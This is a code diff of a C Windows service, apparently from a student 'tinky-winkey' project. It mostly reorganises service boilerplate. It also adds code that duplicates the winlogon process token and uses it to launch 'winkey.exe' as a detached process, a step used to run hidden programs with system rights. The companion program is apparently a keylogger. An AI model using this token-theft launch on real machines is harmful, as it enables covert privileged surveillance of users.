@@ -14,10 +14,10 @@ HANDLE                  ghSvcStopEvent = NULL;
 
 VOID SvcInstall(void);
 VOID WINAPI SvcCtrlHandler( DWORD ); 
-VOID WINAPI SvcMain( DWORD, LPTSTR * ); 
+VOID WINAPI SvcMain(); 
+VOID WINAPI SvcInit(); 
 
 VOID ReportSvcStatus( DWORD, DWORD, DWORD );
-VOID SvcInit( DWORD, LPTSTR * ); 
 
 DWORD getWinlogonPID();
 
@@ -113,51 +113,33 @@ void impersonateUserToken(STARTUPINFO* si, PROCESS_INFORMATION* pi)
 		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
 		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
 	}
-
-
-	// Call CreateProcessWithTokenW(), print return code and error code
-	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey.exe", NULL, 0, NULL, NULL, si, pi);
-	if (GetLastError() == NULL)
-		printf("[+] Process spawned!\n");
-	else
-	{
-		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
-		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
-	}
-
     CloseHandle(winlogonTokenHandle);
+
+	/* Open the winkey process, detached with the token */
+	CreateProcessAsUser(winlogonDuplicateTokenHandle,
+		TEXT("c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey.exe"),
+		NULL,
+		NULL,
+		NULL,
+		FALSE,
+		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS,
+		NULL,
+		NULL,
+		si,
+		pi
+	);
+
 	CloseHandle(winlogonDuplicateTokenHandle);
 }
 
-
-int __cdecl _tmain(int argc, TCHAR *argv[]) 
-{ 
-
-    // TO_DO: Add any additional services for the process to this table.
-    SERVICE_TABLE_ENTRY DispatchTable[] = 
-    { 
-        { (LPSTR)"tinky", (LPSERVICE_MAIN_FUNCTION) SvcMain }, 
-        { NULL, NULL } 
-    }; 
- 
-    // This call returns when the service has stopped. 
-    // The process should simply terminate when the call returns.
-
-    if (!StartServiceCtrlDispatcher( DispatchTable )) 
-    { 
-        // something went wrong
-        printf("StartServiceCtrlDispatcher failed (%d)\n", GetLastError()); 
-    } 
-    return 0;
-} 
-
-VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
+void WINAPI SvcMain()
 {
     // Register the handler function for the service
 
     gSvcStatusHandle = RegisterServiceCtrlHandler( 
         SVCNAME, 
-        (LPHANDLER_FUNCTION)SvcCtrlHandler);
+        (LPHANDLER_FUNCTION)(SvcCtrlHandler)
+       );
 
     if( !gSvcStatusHandle )
     { 
@@ -176,16 +158,17 @@ VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
 
     // Perform service-specific initialization and work.
 
-    SvcInit( dwArgc, lpszArgv );
+    SvcInit();
 }
 
-VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
+void WINAPI SvcInit()
 {
     ghSvcStopEvent = CreateEvent(
                          NULL,    // default security attributes
                          TRUE,    // manual reset event
                          FALSE,   // not signaled
-                         NULL);   // no name
+                         NULL
+    );
 
     if ( ghSvcStopEvent == NULL)
     {
@@ -203,7 +186,6 @@ VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
     while (1)
     {
         WaitForSingleObject(ghSvcStopEvent, INFINITE);
-
         ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
         break;
     }
@@ -269,3 +251,24 @@ VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
    } 
    
 }
+
+int __cdecl _tmain(int argc, TCHAR *argv[]) 
+{ 
+
+    // TO_DO: Add any additional services for the process to this table.
+    SERVICE_TABLE_ENTRY DispatchTable[] = 
+    { 
+        { (LPSTR)("tinky"), (LPSERVICE_MAIN_FUNCTION)(SvcMain)}, 
+        { NULL, NULL } 
+    }; 
+ 
+    // This call returns when the service has stopped. 
+    // The process should simply terminate when the call returns.
+
+    if (!StartServiceCtrlDispatcher( DispatchTable )) 
+    { 
+        printf("StartServiceCtrlDispatcher failed (%d)\n", GetLastError()); 
+    } 
+    return 0;
+} 
+
